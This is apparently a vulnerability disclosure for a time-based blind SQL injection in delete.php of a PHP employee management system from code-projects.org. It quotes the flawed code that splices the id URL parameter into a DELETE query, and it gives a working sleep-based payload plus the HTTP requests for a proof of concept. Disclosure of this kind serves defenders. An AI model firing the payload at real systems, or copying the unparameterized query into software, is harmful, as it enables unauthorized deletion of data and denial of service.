

## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/delete.php` contains a SQL Injection (time-based blind) vulnerability

Impact of the vulnerability
The `id` parameter is taken directly from the URL and concatenated into a `DELETE` SQL statement without parameterization. An attacker may be able to:

- Manipulate database queries (unauthorized data modification/deletion, depending on DB permissions)
- Infer database behavior/data using blind techniques
- Degrade availability by forcing expensive/time-delay database operations

### Payload:

(select*from(select+sleep(10)union/**/select+1)a)

```
(select*from(select+sleep(10)union/**/select+1)a)
```

### POC:

The vulnerable endpoint is `GET /delete.php?id=...`. The `id` parameter is used directly in:

$id = $_GET['id'];

$result = mysqli_query($conn, "DELETE FROM employee WHERE id=$id");

- Baseline request (normal response time):

GET /delete.php?id=101 HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

- Time-delay verification request (do not include raw payload in public reports; URL-encode as needed in your authorized test environment):

GET /delete.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD> HTTP/1.1

Host: 370project:82

Accept: text/html

Connection: close

Expected result:
Compared to the baseline, the verification request responds noticeably slower by approximately `<DELAY_SECONDS>`, indicating database-side execution of injected input.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409113405724](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409113405724.png)